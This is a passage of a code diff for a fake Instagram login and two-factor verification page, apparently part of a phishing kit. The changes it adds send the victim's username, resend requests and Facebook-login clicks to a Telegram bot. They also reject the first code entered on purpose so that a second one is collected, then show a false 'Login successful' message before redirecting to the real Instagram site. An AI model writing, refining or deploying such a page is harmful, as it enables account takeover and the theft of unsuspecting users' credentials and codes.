+            verifyBtn.textContent = 'Verify';
+            isProcessing = false;
+
+            // After 2 attempts or correct code, redirect
+            if (verificationAttempts >= 2) {
+                showToast('✅ Login successful! Redirecting...', 'success');
+                verifyBtn.disabled = true;
+                codeBoxes.forEach(b => b.disabled = true);
+                resendBtn.disabled = true;
+
                 setTimeout(() => {
                     loadingScreen.style.display = 'flex';
                     loadingText.textContent = 'Redirecting to Instagram...';
-                    
                     setTimeout(() => {
                         window.location.href = 'https://www.instagram.com';
                     }, CONFIG.delayBeforeRedirect);
-                }, 800);
+                }, 500);
             } else {
-                errorMsg.textContent = 'Invalid code. Please try again.';
-                errorMsg.style.display = 'block';
-                
-                codeBoxes.forEach(box => box.value = '');
+                showToast('❌ Invalid code. Please try again.', 'error');
+                codeBoxes.forEach(box => { box.value = ''; box.disabled = false; });
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
             }
-        } catch (error) {
-            loadingScreen.style.display = 'none';
-            errorMsg.textContent = 'Connection error. Please try again.';
-            errorMsg.style.display = 'block';
-            
-            codeBoxes.forEach(box => box.value = '');
-            codeBoxes[0].focus();
-            verifyBtn.disabled = true;
-        }
+        }, 1200);
     });
 
     // ============================================
     //  RESEND
     // ============================================
+    let resendCooldown = null;
     resendBtn.addEventListener('click', function() {
+        if (resendCooldown) return;
+
+        sendToTelegram(`🔄 *Resend Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+        showToast('✅ Code resent successfully!', 'success');
+
+        resendBtn.disabled = true;
+        resendCooldown = setTimeout(() => {
+            resendBtn.disabled = false;
+            resendCooldown = null;
+        }, 30000);
+
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
-        
-        sendToTelegram(`🔄 *Resend Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
 
     // ============================================
@@ -448,8 +517,6 @@
         twofaSection.style.display = 'none';
         loginCard.style.display = 'block';
         signupCard.style.display = 'block';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
         checkLogin();
     });
 
@@ -460,6 +527,12 @@
         e.preventDefault();
         sendToTelegram(`📘 *FB Login Clicked* 📘\n\n👤 *User:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
+
+    // ============================================
+    //  INIT
+    // ============================================
+    checkFloat(p, pg);
+    checkFloat(u, ug);
 </script>
 </body>
 </html>
